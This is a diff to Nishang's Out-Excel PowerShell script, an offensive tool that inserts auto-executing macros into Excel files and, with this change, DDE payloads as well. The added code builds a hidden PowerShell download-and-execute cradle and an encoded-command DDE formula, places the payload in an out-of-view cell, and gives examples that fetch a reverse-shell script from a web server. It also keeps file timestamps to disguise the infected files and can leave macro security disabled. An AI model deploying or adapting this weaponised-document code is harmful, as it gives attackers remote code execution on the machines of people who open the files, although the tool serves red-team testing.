@@ -7,10 +7,11 @@ function Out-Excel
 Nishang Script which can generate and "infect" existing excel files with an auto executable macro. 
 
 .DESCRIPTION
-The script can create as well as "infect" existing excel files with an auto executable macro. Powershell payloads
-could be exeucted using the genereated files. If a folder is passed to the script it can insert macro in all existing excrl
+The script can create as well as "infect" existing excel files with an auto executable macro or DDE. Powershell or other payloads
+could be exeucted using the genereated files. If path to a folder is passed to the script it can insert the payload in all existing excel
 files in the folder. With the Recurse switch, sub-folders can also be included. 
-For existing files, a new macro enabled xls file is generated from a xlsx file and for existing .xls files, the macro code is inserted.
+
+For existing files, a new macro or DDE enabled excel file is generated from a xlsx file and for existing .xls files, the payload is inserted.
 LastWriteTime of the xlsx file is set to the newly generated xls file. If the RemoveXlsx switch is enabled, the 
 original xlsx is removed and the data in it is lost.
 
@@ -97,9 +98,20 @@ The above command would search recursively for .docx files in C:\docfiles, gener
 delete the original files.
 
 .EXAMPLE
-PS > Out-Excel -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -RemainSafe
+PS > Out-Excel -PayloadURL http://yourwebserver.com/Invoke-PowerShellTcpOneLine.ps1 -DDE
 
-Out-Excel turns off Macro Security. Use -RemainSafe to turn it back on.
+Use above for DDE attack instead of macro to download and execute PowerShell script in memory.
+
+.EXAMPLE
+PS > Out-Excel -Payload "=cmd|'/c calc.exe'!A1" -DDE
+
+Use above for custom payload with DDE.
+
+.EXAMPLE
+PS > Out-Excel -PayloadScript C:\test\cradle.ps1 -DDE
+
+Use above to encode and use a script with DDE attack. Since only 255 characters are supported with 
+the DDE attack, this is mostly useful only for using encoded cradles.
 
 .LINK
 http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
@@ -108,7 +120,6 @@ https://github.com/samratashok/nishang
 
 
     [CmdletBinding()] Param(
-        
         [Parameter(Position=0, Mandatory = $False)]
         [String]
         $Payload,
@@ -124,27 +135,30 @@ https://github.com/samratashok/nishang
         [Parameter(Position=3, Mandatory = $False)]
         [String]
         $Arguments,
-        
+
         [Parameter(Position=4, Mandatory = $False)]
-        [String]
-        $ExcelFileDir,
+        [Switch]
+        $DDE,
         
         [Parameter(Position=5, Mandatory = $False)]
         [String]
-        $OutputFile="$pwd\Salary_Details.xls",
-
+        $ExcelFileDir,
         
         [Parameter(Position=6, Mandatory = $False)]
+        [String]
+        $OutputFile="$pwd\Salary_Details.xls",
+
+        [Parameter(Position=7, Mandatory = $False)]
         [Switch]
         $Recurse,
         
-        [Parameter(Position=7, Mandatory = $False)]
+        [Parameter(Position=8, Mandatory = $False)]
         [Switch]
         $RemoveXlsx,
 
-        [Parameter(Position=8, Mandatory = $False)]
+        [Parameter(Position=9, Mandatory = $False)]
         [Switch]
-        $RemainSafe
+        $RemainUnSafe
     )
     
     #http://stackoverflow.com/questions/21278760/how-to-add-vba-code-in-excel-worksheet-in-powershell
@@ -180,6 +194,11 @@ https://github.com/samratashok/nishang
 
     if(!$Payload)
     {
+        #Download-Execute payload for DDE
+        # User prompt modification technique from https://null-byte.wonderhowto.com/how-to/exploit-dde-microsoft-office-defend-against-dde-based-attacks-0180706/
+        $DDEPayload = "=MSEXCEL|'\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -W Hidden -NoP iex(New-Object Net.WebClient).DownloadString(\""$PayloadURL\"");$Arguments'!H1"
+
+        #Download-Execute payload for Macro
         $Payload = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
     }
 
@@ -258,6 +277,18 @@ https://github.com/samratashok/nishang
         #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
         $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
         $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
+
+        $DDEPayload = "=MSEXCEL|'\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -W Hidden -e $EncScript'!H1"
+        $DDEPayload | measure -Character
+        if ($DDE)
+        {
+            if ($DDEPayload.Length -ge 256)
+            {
+                Write-Warning "DDE Attack cannot have payload longer than 256 characters. Exiting..."
+                break
+            }
+        }
+
         $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
     }
 
@@ -337,8 +368,26 @@ https://github.com/samratashok/nishang
             $Excel = New-Object -ComObject Excel.Application
             $Excel.DisplayAlerts = $False
             $WorkBook = $Excel.Workbooks.Open($ExcelFile.FullName)
-            $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
-            $ExcelModule.CodeModule.AddFromString($code_one)
+            $WorkSheet=$WorkBook.WorkSheets.item(1)
+            #Insert DDE Payload
+            if ($DDE)
+            {
+                Write-Verbose "Using the DDE technique for dir."
+                if(!$DDEPayload)
+                {
+                    $WorkSheet.Cells.Item(50,50) = $Payloadg
+                }
+                else
+                {
+                    $WorkSheet.Cells.Item(50,50) = $DDEPayload
+                }
+            }
+            else
+            {
+                Write-Verbose "Using auto-executable macro."
+                $ExcelModule = $WorkBook.VBProject.VBComponents.Item(1)
+                $ExcelModule.CodeModule.AddFromString($code_one)
+            }
             $Savepath = $ExcelFile.DirectoryName + "\" + $ExcelFile.BaseName + ".xls"
             #Append .xls to the original file name if file extensions are hidden for known file types.
             if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced).HideFileExt -eq "1")
@@ -359,8 +408,8 @@ https://github.com/samratashok/nishang
             $Excel.Quit()
             [System.GC]::Collect()
             [System.GC]::WaitForPendingFinalizers()
-            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($workSheet)
-            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
+            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($workSheet) | Out-Null
+            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
             Remove-Variable -Name Excel
         }
     }
@@ -368,8 +417,26 @@ https://github.com/samratashok/nishang
     {
         $WorkBook = $Excel.Workbooks.Add(1)
         $WorkSheet=$WorkBook.WorkSheets.item(1)
-        $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
-        $ExcelModule.CodeModule.AddFromString($code_one)
+        $Excel.DisplayAlerts = $False
+        #Insert DDE Payload
+        if ($DDE)
+        {
+            Write-Verbose "Using the DDE technique."
+            if(!$DDEPayload)
+            {
+                $WorkSheet.Cells.Item(50,50) = $Payload
+            }
+            else
+            {
+                $WorkSheet.Cells.Item(50,50) = $DDEPayload
+            }
+        }
+        else
+        {
+            Write-Verbose "Using auto-executable macro."
+            $ExcelModule = $WorkBook.VBProject.VBComponents.Add(1)
+            $ExcelModule.CodeModule.AddFromString($code_one)
+        }
 
         #Add stuff to trick user in Enabling Content (running macros)
         
@@ -400,12 +467,16 @@ https://github.com/samratashok/nishang
         $Excel.Quit()
         [System.GC]::Collect()
         [System.GC]::WaitForPendingFinalizers()
-        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($workSheet)
-        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel)
+        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($workSheet) | Out-Null
+        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
         Remove-Variable -Name Excel
     }
 
-    if ($RemainSafe -eq $True)
+    if ($RemainUnSafe)
+    {
+        Write-Warning "RemainUnsafe selected. Not turning on Macro Security"   
+    }
+    else
     {
         #Turn on Macro Security
         New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\excel\Security" -Name AccessVBOM -Value 0 -Force | Out-Null
